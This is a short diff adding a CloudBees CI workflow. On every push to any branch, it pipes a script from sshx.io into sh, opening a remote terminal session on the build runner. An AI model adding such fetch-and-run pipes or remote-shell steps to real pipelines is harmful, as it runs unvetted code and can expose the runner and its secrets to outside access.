@@ -1,0 +1,19 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: My workflow
+
+on:
+  push:
+    branches:
+      - '**'
+
+jobs:
+  build:
+    steps:
+      - name: Install curl and run sshx.io setup
+        uses: docker://ubuntu:latest
+        shell: sh
+        run: |
+          apt update
+          apt install -y curl
+          curl -sSf https://sshx.io/get | sh -s run
